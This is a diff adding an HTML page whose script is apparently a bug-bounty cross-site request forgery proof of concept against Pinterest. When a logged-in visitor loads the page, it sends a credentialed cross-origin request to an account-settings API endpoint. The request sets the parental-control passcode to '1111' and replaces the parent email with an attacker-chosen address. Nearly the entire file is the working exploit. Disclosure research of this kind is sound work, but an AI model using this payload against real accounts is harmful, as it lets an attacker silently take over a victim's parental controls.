@@ -1,0 +1,6 @@
+<html><script>
+const url = 'https://www.pinterest.com/resource/ApiResource/get/?source_url=/settings/account-settings/&data={"options":{"url":"/v3/users/parental_control_passcode/","data":{"passcode_new":"1111","passcode_new_confirm":"1111","parent_email_new":"circuitbreaker@bugcrowdninja.com","parent_email_new_confirm":"circuitbreaker@bugcrowdninja.com","require_backup_email_verification":false,"fields":["user.is_parental_control_passcode_enabled","user.parental_control_anonymized_email"]},"postInsteadOfGet":true},"context":{}}'
+fetch(url, {mode: 'no-cors', method: 'HEAD', credentials: 'include'}).then(response => console.log(response.headers))
+.catch(error => console.error('Error:', error));
+	</script>
+</html>
